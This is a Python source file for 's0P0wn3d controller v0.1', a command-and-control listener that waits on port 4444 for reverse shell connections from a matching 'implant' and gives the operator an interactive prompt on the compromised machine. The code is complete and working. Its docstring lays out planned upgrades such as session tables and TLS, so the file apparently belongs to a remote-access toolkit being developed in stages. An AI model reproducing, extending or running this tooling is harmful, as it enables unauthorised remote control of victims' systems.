#!/usr/bin/env python3
"""
s0P0wn3d controller - v0.1 "brut"

Single-session TCP listener matching implant v0.1. Receives a reverse shell
connection and gives the operator an interactive prompt.

KNOWN WEAKNESSES (documented on purpose, fixed in later iterations):
  - single session, no session management        -> v0.2: session table
  - no framing: output is drained by timeout     -> v0.2: length-prefixed msgs
  - plaintext traffic                            -> v0.2: TLS (asymmetric)
  - no authentication: anyone connecting gets a shell served to the operator

Stdlib only. Usage:
  python3 s0p0wn3d.py [--host 0.0.0.0] [--port 4444]
"""

import argparse
import select
import socket
import sys

DRAIN_TIMEOUT = 0.4  # seconds of silence before we consider output complete


def drain_output(conn: socket.socket) -> bytes:
    """Read from the socket until the implant goes quiet."""
    chunks = []
    while True:
        ready, _, _ = select.select([conn], [], [], DRAIN_TIMEOUT)
        if not ready:
            break
        data = conn.recv(4096)
        if not data:
            raise ConnectionError("implant closed the connection")
        chunks.append(data)
    return b"".join(chunks)


def run_session(conn: socket.socket, addr: tuple) -> None:
    print(f"[+] session from {addr[0]}:{addr[1]}")
    try:
        banner = drain_output(conn)
        if banner:
            sys.stdout.write(banner.decode(errors="replace"))
            sys.stdout.flush()
        while True:
            try:
                cmd = input()
            except EOFError:
                break
            if cmd.strip() in ("exit", "quit"):
                conn.sendall(b"exit\r\n")
                drain_output(conn)
                break
            conn.sendall(cmd.encode() + b"\r\n")
            output = drain_output(conn)
            sys.stdout.write(output.decode(errors="replace"))
            sys.stdout.flush()
    except (ConnectionError, BrokenPipeError) as exc:
        print(f"\n[-] session lost: {exc}")
    finally:
        conn.close()


def main() -> None:
    parser = argparse.ArgumentParser(description="s0P0wn3d controller v0.1")
    parser.add_argument("--host", default="0.0.0.0", help="listen address")
    parser.add_argument("--port", type=int, default=4444, help="listen port")
    args = parser.parse_args()

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((args.host, args.port))
    listener.listen(1)
    print(f"[*] s0P0wn3d controller listening on {args.host}:{args.port}")
    print("[*] waiting for implant... (Ctrl+C to quit)")

    try:
        while True:
            conn, addr = listener.accept()
            run_session(conn, addr)
            print("[*] back to listening")
    except KeyboardInterrupt:
        print("\n[*] shutting down")
    finally:
        listener.close()


if __name__ == "__main__":
    main()
